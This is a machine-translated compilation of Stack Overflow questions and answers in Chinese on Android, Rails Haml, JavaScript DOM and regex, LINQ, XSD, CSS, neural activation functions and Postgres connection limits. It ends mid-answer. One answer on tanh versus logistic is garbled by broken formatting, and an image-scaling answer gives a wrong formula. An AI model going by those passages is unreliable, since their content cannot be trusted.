如果您不使用 html，请尝试设置[页边距](http://www.tcpdf.org/doc/classTCPDF.html#ab3bbdb7c85ea08d175fd559be6132ba0)或使用 PHP 拆分文本`substr()`，然后[`AutoPageBreak`在 TCPDF 中设置](http://www.tcpdf.org/doc/classTCPDF.html#a4430365ea0b9015b4aefedad1ba77ea9)

# android - 如何获取已缩放的图像宽度

> ID：11847111
> 
> 赞同：6
> 
> 时间：2012-08-07T13:29:07.837
> 
> 标签：android, imageview, width, pixel

![在此处输入图像描述](../Images/91c7cfeaa29e5b353aaff9ed455aebb5.png)

*   实际图像源高度 = 180px 和宽度 = 192px
*   ImageView 的宽度为 90 像素，高度为 60 像素。

我想知道实际图像高度和宽度是如何在屏幕上显示的。有人可以帮助我吗？

我尝试了以下但它没有给我我正在寻找的结果

*   如果我做 imageview.getWidth 我得到 ImageView 的 90px
*   如果我执行 imageView.getMeasuredWidth 我得到 ImageView 的 90px
*   如果我做 imageview.getDrawable.getIntrinsicWidth 我得到 192px 的实际源宽度
*   如果我做 imageview.getDrawable.getBounds 我得到 192px 的实际源宽度
*   如果我检索位图并执行 getScaledWidth(metrics) 我得到 192px 的实际源宽度

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-07T13:35:54.793

你可以尝试这样的事情：

*   你有图像高度（IH）和图像宽度（IW）
*   找到 ImageView 高度 (H)。
*   找到 ImageView 的顶部填充 (TP) 和底部填充 (BP)
*   您显示的图像高度为 DIH = H - (BP + TP)
*   显示图像宽度 DIW = (IW * DIH) / IW；

我希望我能理解你的问题。

# ruby - Haml 语法错误> 非法元素类和 id 必须有值

> ID：11847112
> 
> 赞同：1
> 
> 时间：2012-08-07T13:29:09.270
> 
> 标签：ruby, ruby-on-rails-3, syntax, haml

我的观点是这样的：

```
%tr
   %th =link_to 'Name', :sort =>'name', :id => 'name_header' 
```

我的视图控制器方法有：

```
@students = Student.order(params[:sort]).all 
```

我正在尝试通过单击列标题进行排序。同样，我尝试`params[:id]`了，`params[:sort]`但它也失败了。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-07T13:42:14.027

我无法重现该错误，但您将 HTML 选项代替 URL 选项传递给[link_to](http://api.rubyonrails.org/classes/ActionView/Helpers/UrlHelper.html#method-i-link_to)。这可能会解决它：

```
%th= link_to 'Name', '#', :sort =>'name', :id => 'name_header' 
```

另请注意，它应该是

```
 %th= link_to 
```

并不是

```
 %th =link_to 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-07T13:53:16.890

确保 Student 具有列名称。这将找到所有喜欢的学生`find_all`都按参数中具有键的值排序`sort`。我们期望是`"name"`。

```
@students = Student.find(:all, :order => 'name') if params[:sort]=='name' 
```

对于您的 .haml，分配`id`锚标记；

```
%tr
  %th= link_to "Name", params.merge(:sort => 'name'), :id => 'name_header' 
```

或者，将 分配`id`给表头。

```
%tr
  %th{:id => 'name_header'}= link_to "Name", params.merge(:sort => 'name') 
```

使用[**.merge()**](http://www.ruby-doc.org/core-1.9.3/Hash.html#method-i-merge)可以保留旧参数，如果单击链接，则添加 GET 参数`sort`。因为我没有意识到是否`id`是链接的表头，所以我放了两个解决方案！作为[**示例**](https://github.com/saasbook/hw3_rottenpotatoes/)，您可以克隆此应用程序并在`/movies`.

# javascript - 如何在不创建新元素的情况下修改 DOM 元素的位置？

> ID：11847113
> 
> 赞同：1
> 
> 时间：2012-08-07T13:29:09.627
> 
> 标签：javascript, dom

我有一些看起来像这样的简单 HTML：

```
<body>
  <form action="#">
    <button type="button" onclick="changeDOM();">Change DOM</button>
  </form>
  <table>
    <tr id='a'><td>a</td></tr>
    <tr id='b'><td>b</td></tr>
    <tr id='c'><td>c</td></tr>
  </table>
</body> 
```

我希望该`changeDOM`函数将表格的顶行推为底行，并将其余行“冒泡”。我试着这样做：

```
function changeDOM() {
    var nextRow = currentRow.nextSibling;
    currentRow.className='';
    nextRow.nextSibling = currentRow;
    currentRow = nextRow;
    currentRow.className='highlight';
    return true;
}

var currentRow;
currentRow = document.getElementById('a');
currentRow.className='highlight'; 
```

不幸的是，当我单步调试调试器时，我注意到它`nextSibling`并没有像我预期的那样设置。我在网上看到了一些类似的代码，但它们实际上是删除节点并附加它们。两个问题：

1.  **有没有办法在不创建和销毁它们的情况下改变 DOM 元素的位置？**

2.  如果 (1) 的答案是肯定的，那么**我该怎么做？**

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-07T14:55:33.990

`.removeChild`和`.appendChild`方法实际上并不删除或创建任何东西，它们只是建立和删除节点与其父节点的关联。使用这些方法，您将完全按照您的意愿进行操作 - 无需任何开销即可移动元素。

正如 MDN 文档[`.removeChild`](https://developer.mozilla.org/en-US/docs/DOM/Node.removeChild)所说：

```
var oldChild = element.removeChild(child) 
```

> 被移除的子节点仍然存在于内存中，但不再是 DOM 的一部分。您可以稍后通过 oldChild 对象引用在代码中重用已删除的节点。

实际上，由于元素只能有一个父元素，因此 using`.appendChild`和所有其他类似方法会自动将其从先前的位置删除，因此您可以在不使用元素的情况下移动元素`.removeChild`。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-07T13:48:07.257

如果你愿意使用 jQuery，有一个简单的函数可以做到这一点。您可以检查以下示例：

[http://api.jquery.com/detach/](http://api.jquery.com/detach/)

# javascript - 仅当开引号存在时才匹配闭引号

> ID：11847114
> 
> 赞同：0
> 
> 时间：2012-08-07T13:29:17.647
> 
> 标签：javascript, regex

我的字符串本质上与`'foo = "bar"'`. 现在，当我测试这些字符串是否通过某个正则表达式时，我正在测试 'bar' 周围的引号`["|']?`，使该区域中的完整 RegEx 类似于`["|']?(\w+)["|']?`（为了便于阅读，我删除了不相关的表达式部分）。

这意味着几件事：

*   单词周围的引号可以是双引号、单引号或不存在。
*   不管它们是什么，它们都不是“链接”的。如果在左侧使用双引号而在右侧没有引号，这仍然会通过，等等。

我的目标是根据第一个报价匹配第二个报价。我非常想完全用 RegEx 来实现它，尽管我知道我正在接近它所能做的极限（就 JavaScript 实现而言）。我对前瞻/后视非常熟悉，但据我了解，这些只有在引述感人的情况下才有意义。我希望我理解错误。

PS：我只担心现代浏览器，所以 IE<10 支持不是问题。

PPS：我提到我想用 RegEx 来做这件事。请节省自己的精力，不要给出替代方案。“你不能这样做”就足够了。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-07T13:31:32.377

你可以写：

```
/(["'])\w+\1/ 
```

`\1`只会匹配与第一个[捕获组](http://www.regular-expressions.info/brackets.html)( `(["'])`) 捕获的字符串相同的字符串。

请注意，我`|`从[字符类](http://www.regular-expressions.info/charclass.html) `["']`中删除了管道字符，因为它似乎是一个错误：管道字符在字符类中没有任何特殊含义。`["|']`仅当您希望能够匹配时才正确，例如`|bar|`.

# c# - 在 DataGridView 中查找包含最匹配的 DateTime 对象的行

> ID：11847122
> 
> 赞同：0
> 
> 时间：2012-08-07T13:29:59.803
> 
> 标签：c#, .net, winforms

我需要在我的已知列中搜索`DataGridView`并返回包含`DateTime`具有最接近匹配时间的对象的行（即小于所需的搜索时间）。

我过去曾使用 linq 来搜索`DataGridView`数据。但在那些情况下，我正在寻找一个完全匹配的，如：

```
public DataGridViewRow FindRow(DataGridView dgv, string columnID, object searchID)
    {
        DataGridViewRow row = dgv.Rows
            .Cast<DataGridViewRow>()
            .Where(r => r.Cells[columnID].Value.Equals(searchID))
            .First();

        return row;
    } 
```

现在我有一个包含所有对象的精确`DateTime`对象。`DataGridView``DateTime`

```
DateAdded       Data1    Data2
12:34:56.012    x        y
12:34:56.345    x        y
12:34:56.678    x        y 
```

在上述情况下，如果我正在搜索`DateTime`“12:34:56.4”的对象，我想返回包含“12:34:56.345”的第二行。

我仍然熟悉 linq。有人有什么想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-07T13:37:09.660

有时提出问题可以帮助您自己回答...

```
public DataGridViewRow FindRow(DataGridView dgv, DateTime searchID)
    {
        DataGridViewRow row = dgv.Rows
            .Cast<DataGridViewRow>()
            .Where(r => ((DateTime)r.Cells["DateAdded"].Value <= searchID))
            .Last();

        return row;
    } 
```

这成功了。

# linq - LINQ 组合组并获得不同的最大出现次数

> ID：11847123
> 
> 赞同：0
> 
> 时间：2012-08-07T13:30:00.643
> 
> 标签：linq, count, grouping, distinct

我有许多项目列表，它们以两个 int 值的形式出现，称为 basketId、ProductNameId，它们已被选中并保留。例如 {{1,1} {1,2}, {1,3}} 到某个较高的购物篮Id {{n,2} {n,6}, {n,6},{n,6},{ n,7},{n,8}}。篮子的数量会有所不同，每个篮子的条目数量也会有所不同。

对于所有篮子集中存在的每个 ID，我需要 ProductNameId 和 Max Count 形式的输出。对于上面显示的两个，这将是：1,1, 2,1, 3,1, 6,3, 7,1, 8,1

我有以下代码并且它可以工作，但它看起来很丑陋而且冗长，所以我请求一些帮助以提出更好的方法/更简洁 - 也许是一个相同的语句。

```
// Get all the baskets that have been saved
var baskets = Baskets.Where(x => x.MarketId == 1);

// Group and get count for each product in each basket
var counts = from q1 in all
group q1 by new 
{
    q1.ProductNameId,
    q1.BasketId
}
into g
select new
{
    ProductNameId = g.Key.ProductNameId,
    Count = g.Count ()
};

// Group products and find the Maximum count that exists
var max = from q2 in counts
group q2 by q2.ProductNameId
into g
select new
{
    ProductNameId = g.Key,
    Max = g.Max (x => x.Count)
};

// The distinct set of values present
var distinct = max.Distinct(); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T01:18:28.173

这是一个相当直接的方法：

```
var query =
    baskets
        .ToLookup(b => b.ProductNameId)
        .Select(l => new
        {
            ProductNameId = l.Key,
            Max = l.Count(),
        }); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-07T13:58:52.130

您的基础数据对我来说仍然有点神秘，但是从您的代码的样子来看，我相信您正在尝试这样做：

```
// Get all the baskets that have been saved  
var baskets = Baskets.Where(x => x.MarketId == 1);  

// Group and get count for each product in each basket 
var distinct = from q1 in baskets 
    group q1 by q1.ProductNameId into g
    select new
    {
        ProductNameId = g.Key,
        Max = (from q2 in g
            group q2.BasketId by q2.BasketId).Max (x => x.Count())
    }; 
```

# php - 来自网站 URL 的 PHP XML 解析

> ID：11847124
> 
> 赞同：0
> 
> 时间：2012-08-07T13:30:00.607
> 
> 标签：php, xml-parsing

我在网上有一个 XML 文件，我试图将其拆分为变量并显示给用户。

这是文件的网址： [http ://www.labs.skanetrafiken.se/v2.2/querypage.asp?inpPointFr=lund&inpPointTo=ystad](http://www.labs.skanetrafiken.se/v2.2/querypage.asp?inpPointFr=lund&inpPointTo=ystad)

从我读过的内容来看，这现在似乎很容易做到，但我唯一要做的就是这个。

```
$xml = new SimpleXMLElement($url, null, true);
echo $xml->asXML(); // this spits out a huuuge string. 
```

*没有*其他任何工作。不是 simplexml_load_string() 或其他任何东西。

我已经阅读了大约 20-40 个教程，但没有一个有效，可以这么说有点沮丧。

# c# - 如何将元素添加到现有的 xsd:complexType？

> ID：11847126
> 
> 赞同：1
> 
> 时间：2012-08-07T13:30:24.713
> 
> 标签：c#, xml, xsd, altova

我有一组架构定义，其中一个文件将 xsd:ComplexType 定义为“FloatingRateCalculation”，现在我想扩展此类型并想向其中添加一个元素，并且我不想干扰现有架构。我想创建一个单独的 .xsd 文件，其中包含原始“FloatingRateCalculation”的架构。

我想这样做，以便供应商提供的原始模式保持不变......

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-08T16:51:10.217

如果原始架构看起来像这样（Original.xsd）

```
<?xml version="1.0" encoding="utf-8" ?>
<!--Created with Liquid XML Studio 2012 Developer Edition 10.1.2.4113 (http://www.liquid-technologies.com)-->
<xs:schema elementFormDefault="qualified" xmlns:xs="http://www.w3.org/2001/XMLSchema">
    <xs:complexType name="FloatingRateCalculation">
        <xs:sequence>
            <xs:element name="Stuff" type="xs:string" />
        </xs:sequence>
    </xs:complexType>
</xs:schema> 
```

![在此处输入图像描述](../Images/0a1b3b74ca3e509415fc59c888accb97.png)

然后你的架构（Extension.xsd）应该看起来像这样

```
<?xml version="1.0" encoding="utf-8" ?>
<!--Created with Liquid XML Studio 2012 Developer Edition 10.1.2.4113 (http://www.liquid-technologies.com)-->
<xs:schema elementFormDefault="qualified" xmlns:xs="http://www.w3.org/2001/XMLSchema">
    <xs:include schemaLocation=".\Original.xsd" />
    <xs:complexType name="FloatingRateCalculationEx">
        <xs:complexContent>
            <xs:extension base="FloatingRateCalculation">
                <xs:sequence>
                    <xs:element name="MoreStuff" type="xs:string" />
                </xs:sequence>
            </xs:extension>
        </xs:complexContent>
    </xs:complexType>
</xs:schema> 
```

![在此处输入图像描述](../Images/0a1b3b74ca3e509415fc59c888accb97.png)

# objective-c - Core Text CTFrame 上的可点击区域

> ID：11847127
> 
> 赞同：2
> 
> 时间：2012-08-07T13:30:29.753
> 
> 标签：objective-c, ios, cocoa-touch, core-text

我在 UIScrollView 上放置了一些 CTFrame 文本列，我制作了一个选择工具来选择和突出显示文本，如下图所示。

我希望能够单击选择，因此矩形是在 CTFrame 上具有 50% 不透明度的 UIButton。

问题如下：由于某种原因，按钮TouchUpInside事件没有被触发，我认为如果将高亮放在CTFrame下方，效果会更好，但我认为按钮不会收到事件。

解决问题的任何想法，即在文本下方有一个选择标记并且可点击？

* * *

这是文本突出显示示例：

![CTFrame 上的文本选择](../Images/292e356c46a81db65a6a1cfd27c1108d.png)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-07T13:48:34.113

您是如何将 CTFrames 放置到 UIScrollView 的？CTFrame 不是 UIView 子类。你在哪里画的？还要检查您的 UIScroll 视图的内容大小。

使用 UIButtons 不是个好主意，最好直接用 Core Graphics 来绘制。触摸应该由 UIView 本身处理，然后翻译成适当的文本。用于`CTFrameGetLineOrigins()`查找正确的行（通过检查 Y 原点），然后使用`CTLineGetStringIndexForPosition()`查找行内的正确字符（从点减去行原点后）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-23T23:26:22.810

我认为您可以使用点击手势识别器，当点击时，只需检查点击点是否在突出显示部分的矩形中。而且我认为点击手势识别器适用于 UIScrollView（不像其他手势）。

# c# - 通过选定的标签过滤文档列表

> ID：11847129
> 
> 赞同：2
> 
> 时间：2012-08-07T13:30:36.217
> 
> 标签：c#, winforms, entity-framework-4, filtering

我正在尝试使用选中的列表框过滤 winforms 应用程序中显示的文档，以便在选择 2 个标签时，只有包含这些标签的文档会显示出来，并在选择第三个标签时进一步筛选。我正在使用实体框架。这是我所拥有的，但我认为它可能效率不高。我不喜欢我必须经常查询数据库。有什么想法吗？

```
List<int> docIds = null;
        if (tags != null)
        {
            docIds.AddRange(from di in frmFocus._context.AllocateDocumentTags
                            where di.tagId == tags[0]
                            select di.documentId);
            for (int i = 1; i < tags.Length; i++)
            {
                List<int> docList = (from dId in frmFocus._context.AllocateDocumentTags
                                     where dId.tagId == tags[i]
                                     select dId.documentId).ToList();
                foreach (int n in docIds)
                {
                    if (!docList.Contains(n))
                    {
                        docIds.Remove(n);
                    }
                }
            }

        } 
```

* * *

现在我正在尝试根据 ID 显示文档，但是......这是新代码

```
docIds = (from di in frmFocus._context.AllocateDocumentTags.Distinct()
                                    where tags.Contains(di.tagId)
                                    select di.documentId).ToList();
                tagManagment.fillUsed(docIds);
            }
            ObjectSet<Documents> _docs = (from d in frmFocus._context.Documents
                     where docIds.Contains(d.id)
                     select d); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-07T13:48:50.163

你基本上可以在标签上做一个包含：

```
List<int> docIds = (from di in frmFocus._context.AllocateDocumentTags
                    where tags.Contains(di.tagId)
                    select di.documentId); 
```

对于加入：

```
ObjectSet<Documents> _docs = (from doc in docIds
                              join d in frmFocus._context.Documents.ToList()  on doc equals d.id
                              select d); 
```

# html - 使用 CSS text-decoration: underline 时删除一个像素的间隙

> ID：11847131
> 
> 赞同：0
> 
> 时间：2012-08-07T13:30:43.263
> 
> 标签：html, css, stylesheet, styling, text-decorations

我的网站上有以下 CSS 和标记，当我将鼠标悬停在`Account`链接上时会产生下划线。

默认情况下，下划线显示在文本之外的一个像素处。是否可以在*没有*一个像素间隙的情况下*直接*在文本下方添加下划线。

 *如果可能的话，我希望我网站上的所有链接都使用这个。

```
a:active {
    outline: none;
}

a.current {
    text-decoration: underline;
    color: #000000;
    outline: none;
}
a:hover, a.active {
    color: #000000;
    outline: medium none;
    text-decoration: underline;
}

<a href="http://www.ayrshireminis.com/account/login/">Account</a> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-07T13:57:57.540

是的，您可以使用底部边框，但您需要启用 inline-block 样式才能正确调整锚点的行高：

```
a {
    text-decoration: none;
    color: #c64;

    /* cross-browser inline-block styling */
    display:inline-block;
    zoom:1;
    *display:inline;

    /* alter line-height until the border appears where you want it */
    line-height: .7em;
}

a:hover, a:active{
    padding-bottom:0;
    border-bottom:1px solid black;
} 
```

[**jsFiddle 演示**](http://jsfiddle.net/5d7j3/2/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-07T13:35:35.460

不，你不能修改它。但是，您可以使用以下内容伪造它：

```
a:hover, a.active{
    border-bottom:1px solid black;
}​

a{
    padding-bottom:0;
    display:inline-block;
    line-height:.8 /*adjust accordingly*/;
} 
```

是`display:inline-block;`line-height 正常工作所必需的。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-07T13:55:47.170

你想要制作`<a>`a 块，否则填充不会影响任何东西。

`a { display: block; line-height:0.75em; ... etc }`

`a:hover { border-bottom:1px solid #000; }`

[http://jsfiddle.net/y49jN/3/](http://jsfiddle.net/y49jN/3/)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-05T10:36:37.350

我还发现`height`将 div、span 或 p 设置为小于`font-size`并使用`border-bottom: 1px solid black`而不是`text-decoration: underline`使边框更接近文本或元素。*

# function - 神经激活函数 - Logistic / Tanh / 等之间的区别

> ID：11847133
> 
> 赞同：11
> 
> 时间：2012-08-07T13:30:46.453
> 
> 标签：function, math, machine-learning, statistics, neural-network

我正在编写一些基本的神经网络方法——特别是激活函数——并且已经达到了我垃圾数学知识的极限。我了解各自的范围（-1/1）（0/1）等，但不同的描述和实现让我感到困惑。

特别是*sigmoid*、*logistic*、*bipolar sigmoid*、*tanh*等。

*sigmoid*是否简单地描述了函数的形状而不考虑​​范围？如果是这样，那么 tanh 是一个“sigmoid 函数”吗？

我在一篇论文中看到了 'bipolar sigmoid' 与 'tanh' 的比较，但是我看到两个函数都使用相同的代码实现（在各种库中）：

(( 2/ (1 + Exp(-2 * n))) - 1)。它们完全一样吗？

同样，我看到了用相同的代码实现的*逻辑*和*sigmoid*激活：

( 1/ (1 + Exp(-1 * n)))。这些也是等价的吗？

最后，在实践中它甚至那么重要吗？我在 wiki 上看到了一个[非常相似的 sigmoid 函数图](http://upload.wikimedia.org/wikipedia/commons/thumb/6/6f/Gjl-t%28x%29.svg/1000px-Gjl-t%28x%29.svg.png)- 可以使用其中的任何一个吗？有些看起来他们的计算速度可能比其他人快得多。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-08-07T15:23:53.560

逻辑函数：e ^x /(e ^x + e ^c )

逻辑函数的特殊（“标准”）情况：1/(1 + e ^(-x) )

双极乙状结肠：从未听说过。

tanh: (e ^x -e ^(-x) )/(e ^x + e ^(-x) )

*Sigmoid*通常指的是形状（和限制），所以是的，tanh 是一个 sigmoid 函数。但在某些情况下，它专门指标准逻辑函数，因此您必须小心。是的，你可以使用任何 sigmoid 函数并且可能做得很好。

(( 2/ (1 + Exp(-2 * x))) - 1) 等价于 tanh(x)。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2014-08-22T23:48:49.680

一般来说，最重要的区别是 a。平滑连续可微分，如 tanh 和logistic vs step 或截断b。竞争与转移 C. sigmoid 与径向 d. 对称 (-1,+1) 与非对称 (0,1)

通常隐藏层需要可微分要求，通常建议使用 tanh 更平衡。tanh 的 0 位于最快点（最高梯度或增益）而不是陷阱，而逻辑 0 是最低点，是任何深入负区域的陷阱。径向（基）函数与典型原型的距离有关，适用于神经元周围的凸圆形区域，而 sigmoid 函数是关于线性分离并适用于半空间 - 并且需要很多才能很好地逼近凸区域，其中圆形/球形区域对 sigmoid 最差，对径向最好。

通常，建议在中间层上使用 tanh 以实现 +/- 平衡，并使输出层适合任务（具有阈值、逻辑或竞争输出的布尔/二分类决策（例如 softmax，逻辑的自归一化多类泛化） ）；回归任务甚至可以是线性的）。输出层不需要连续可微。输入层应该以某种方式归一化，要么到 [0,1]，要么更好的标准化或归一化，贬低到 [-1,+1]。如果您包含 1 的虚拟输入，则归一化，因此 ||x||p = 1 您将除以总和或长度，并且此幅度信息保留在虚拟偏置输入中，而不是丢失。如果您对示例进行标准化，如果您查看它们，这在技术上会干扰您的测试数据，否则，如果您不这样做，它们可能会超出范围。但是通过 ||2 归一化，如果这些变化或误差是自然分布或误差的影响，它们应该接近正态分布。这意味着它们很有可能不会超出原始范围（可能约为 2 个标准偏差）超过一个小因素（即，此类超范围值被视为异常值且不显着）。

因此，我建议在输入层上进行无偏实例标准化或有偏模式标准化或两者兼而有之（可能使用 SVD 进行数据缩减），在隐藏层上使用 tanh，在输出上使用阈值函数、逻辑函数或竞争函数进行分类，但与未归一化的目标，或者可能带有归一化目标的 logig 用于回归。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2015-02-02T02:44:20.510

这个词是（我已经测试过）在某些情况下使用**tanh**可能比使用**逻辑**更好，因为

1.  输出接近**逻辑**乘以权重会产生一个接近的值，`Y = 0`该值对它所影响的上层*没有太大影响（尽管缺少也会影响），但是接近于***tahn**乘以权重的值可能会产生一个更大的数字，它有更多数值效应。**`w``0`*`Y = -1`**`w`*****
******   **tanh** ( )的导数`1 - y^2`产生的值大于**逻辑**( `y (1 -y) = y - y^2`)。例如，当 时`z = 0`，**逻辑**函数产生`y = 0.5`和`y' = 0.25`，对于**tanh** `y = 0`但是`y' = 1`（您通常可以通过查看图表来了解这一点）。这意味着由于梯度的大小，tanh 层可能比逻辑层**学习**得**更快****。*******

 ****** * *

## 回答 #4

> 赞同：0
> 
> 时间：2015-09-23T09:23:05.517

双极 sigmoid = (1-e^(-x))/(1 + e^(-x))

详细解释可以在[这里找到](http://www.cscjournals.org/manuscript/Journals/IJAE/volume1/Issue4/IJAE-26.pdf)*****

# postgresql - Heroku“psql: FATAL: 剩余的连接槽是为非复制超级用户连接保留的”

> ID：11847144
> 
> 赞同：156
> 
> 时间：2012-08-07T13:31:41.167
> 
> 标签：postgresql, heroku

我正在使用 Postgresql 后端在 Heroku 上开发一个应用程序。在尝试从 CLI 和在服务器上加载页面时，我会定期收到此错误消息：

```
psql: FATAL: remaining connection slots are reserved for non-replication superuser connections 
```

任何人以前见过这个或请帮助我指出正确的方向？

* * *

## 回答 #1

> 赞同：82
> 
> 时间：2012-08-07T14:58:34.870

您要么需要增加`max_connections`配置设置，要么（可能更好）[使用连接池](https://stackoverflow.com/questions/10419665/how-does-pgbouncer-help-to-speed-up-django/10420469#10420469)通过较小的连接池路由大量用户请求。

[https://wiki.postgresql.org/wiki/Number_Of_Database_Connections](https://wiki.postgresql.org/wiki/Number_Of_Database_Connections)

* * *

## 回答 #2

> 赞同：18
> 
> 时间：2013-04-11T14:17:26.050

当我忘记关闭连接时发生此异常

* * *

## 回答 #3

> 赞同：9
> 
> 时间：2015-08-12T16:30:58.800

* * *

## 回答 #4

> 赞同：6
> 
> 时间：2013-01-17T05:22:32.490

我实际上尝试使用以下方法在 django 端实现连接池：

[https://github.com/gmcguire/django-db-pool](https://github.com/gmcguire/django-db-pool)

但我仍然收到此错误，尽管将可用连接数降低到低于 20 个打开连接的标准开发数据库配额。

这里有一篇关于如何将您的 postgresql 数据库移动到 Amazon RDS 的免费/廉价层的文章。这将允许您设置`max_connections`更高。这也将允许您使用 PGBouncer 在数据库级别池连接。

[https://www.lewagon.com/blog/how-to-migrate-heroku-postgres-database-to-amazon-rds](https://www.lewagon.com/blog/how-to-migrate-heroku-postgres-database-to-amazon-rds)

**更新：**

Heroku 回复了我的公开票，并表示我的数据库在他们的网络中负载平衡不正确。他们说，改进他们的系统应该可以防止将来出现类似的问题。尽管如此，支持手动重定位我的数据库和性能显着提高。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2021-05-13T15:52:06.643

要在 Linux 中重现相同的问题：

```
for i in {1..300}; do
     PGPASSWORD=MY_PASSWORD gnome-terminal -e  $'/usr/bin/psql -h \'127.0.0.1\' -p 5432 -U MY_USERNAME' 
done 
```

在 dotnet 客户端中，您可以阅读：

> ```
>  System.InvalidOperationException: An exception has been raised that is likely due to a transient failure.
>    ---> Npgsql.PostgresException (0x80004005): 53300: sorry, too many clients already 
> ```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2022-02-16T04:38:16.563

该错误消息意味着该应用程序已用完所有可用连接。

在aws中使用带有knex和typescript的postgres进行一些查询和更新工作时，当它完成390个数据库操作时会弹出问题，错误会阻止正常的knex.destroy()操作。错误信息是：

（节点：66236）UnhandledPromiseRejectionWarning：错误：剩余的连接槽保留用于非复制超级用户连接

当 knex.destroy() 转到正确的位置时，错误就消失了。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2021-09-29T11:43:28.423

在我的情况下，我有很多空闲连接，所以我必须在创建新连接之前重用空闲连接，

# php - 如何使用 RegEx 替换 Notepad++ 中的 HTML 代码

> ID：11847147
> 
> 赞同：0
> 
> 时间：2012-08-07T13:31:46.697
> 
> 标签：php, html, regex, notepad++

我有很多 php 页面。每个 php 页面都有一个这样的字符串：

```
<FONT COLOR="#0000FF">Post ID: 16107</FONT> 
```

我想替换为：

```
<A HREF="#16107">Post ID: 16107</A> 
```

但由于每个 php 页面都有不同的 Post ID，我想匹配每个出现的字符串......我通常使用 notepad2 女巫支持正则表达式和 notepad++ 也支持正则表达式。如何将所有字符串替换为所有目录中的所有文件？大约有350个文件...

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-07T13:49:57.943

*代替：* `<FONT COLOR=".*?">(Post ID: ([0-9]+))</FONT>`

*和：* `<A HREF="#\2">\1</A>`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-07T13:47:02.653

搜索

`<FONT COLOR=".*?">Post ID: (\d+)<\/FONT>`

用。。。来代替

`<A HREF="#$1">Post ID: $1<\/A>`

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-07T13:46:36.003

很高兴知道这是可能的：

在 Notepad++ 中，您需要搜索`Keep ID: ([0-9]*)`并将其替换为`New ID: $1`.

*   `$0`表示找到的全部内容，`$1`括号中是第一个找到的。
*   您可以`[]`用来创建一个类（在本例中为数字 0 到 9）
*   最后，星号告诉解析器尽可能多地重复前一个字符或字符类。

# java - 为 Hadoop 编写 Junit 测试用例

> ID：11847154
> 
> 赞同：0
> 
> 时间：2012-08-07T13:32:15.273
> 
> 标签：java, junit, hadoop, mapreduce, junit4

您能否就我如何为私有函数编写 JUnit 测试用例提供宝贵意见

```
 private int readCustomLine(Text str, int maxLineLength, int maxBytesToConsume)
      throws IOException { 
```

在hadoop中。

该函数是从以下公共函数调用的 -

```
public int readLine(Text str, int maxLineLength,
                      int maxBytesToConsume) throws IOException { 
```

它属于**org.apache.hadoop.util**包中的**LineReader**类。

 **对此很困惑，因为我之前没有写过任何测试用例，这方面的另一个问题是我们需要在这里解决一个大数据集。**

# flash-builder - Flash Builder 4.6 消息：“工作区正在使用或无法创建，请选择其他工作区。”

> ID：11847155
> 
> 赞同：0
> 
> 时间：2012-08-07T13:32:16.840
> 
> 标签：flash-builder

当我尝试启动 Flash Builder 时，它会显示此消息：“工作区正在使用或无法创建，请选择其他工作区。” 我已经尝试卸载并重新安装该程序，但问题仍然存在。此外，我还删除了工作区文件夹中 .metadata 文件夹中的 .lock 文件，但不起作用。我该如何解决这个问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-19T17:07:51.830

尝试以管理员身份启动 Flash Builder。为我工作。

# javascript - 不正确的复选框重定向

> ID：11847162
> 
> 赞同：0
> 
> 时间：2012-08-07T13:32:49.037
> 
> 标签：javascript

有人可以告诉我下面的函数有什么问题吗？

```
<form name="Menu" id="menu" onsubmit="this.enviar();">
<select id="pais" name="pais" size="1"">
  <option value="polonia">Polónia</option>
  <option value="portugal">Portugal</option>
  <option value="reino-unido">Reino Unido</option>
</select>
<select id="area" name="area" size="1">
  <option value="#">Seleciona uma área </option>
  <option value="arquitetura">Arquitetura</option>
  <option value="comunicacao">Comunicação</option>
  <option value="design">Design</option>
</select>
<input type="submit" value="Pesquisar"/>
</form>
<script type="text/javascript">// <![CDATA[
function vai(link) { location.href= link; }
function enviar(){
var pais = document.menu.pais.value;
var area = document.menu.area.value;
           window.location.href("http://www.teste.pt/tag/"+pais+"+"+area);
}
// ]]></script> 
```

而不是去链接`http://www.teste.pt/tag/pais+area`，这样做：`http://teste.pt/?pais=holanda&area=informatica`

有人可以帮助我吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-07T13:36:33.530

只需更改函数`href`中的目标即可。`enviar()`由于变量正在成为查询字符串的一部分，因此建议也将它们包装起来，`encodeURIComponent`以便为此目的对它们进行正确编码。

```
function enviar(){
  // Also recommend using getElementById() to get these nodes
  var pais = document.getElementById("pais").value;
  var area = document.getElementById("area").value;
  window.location.href("http://teste.pt?pais=" + encodeURIComponent(pais) + "&area=" + encodeURIComponent(area));
} 
```

### 评论后更新：

如果您希望 JavaScript 继续重定向到同一链接`http://www.teste.pt/tag/"+pais+"+"+area`但在内部将其处理为`http://teste.pt/?pais=holanda&area=informatica`，则必须使用重写规则来完成。如果您使用的是 Apache，则应将以下内容放入您的 .htaccess 文件中：

```
